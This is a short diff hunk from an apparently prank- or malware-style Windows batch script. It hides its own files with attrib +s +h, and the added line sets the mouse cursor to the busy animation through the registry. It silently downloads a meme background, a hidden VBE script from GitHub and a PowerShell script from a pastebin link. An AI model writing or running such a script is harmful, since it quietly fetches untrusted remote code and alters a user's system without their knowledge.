@@ -8,6 +8,7 @@ attrib +s +h t
 attrib +s +h s.bat
 cd t
 
+reg add "HKCU\Control Panel\Cursors" /v Arrow /d "%SystemRoot%\cursors\aero_busy.ani" /f
 curl -s https://everythingisviral.com/wp-content/uploads/2021/01/gigachad-meme.png -o background.png
 curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/Screenshot/invisible.vbe -o i.vbe
 curl -s https://pastebin.com/raw/dsLQmyew -o s.ps1
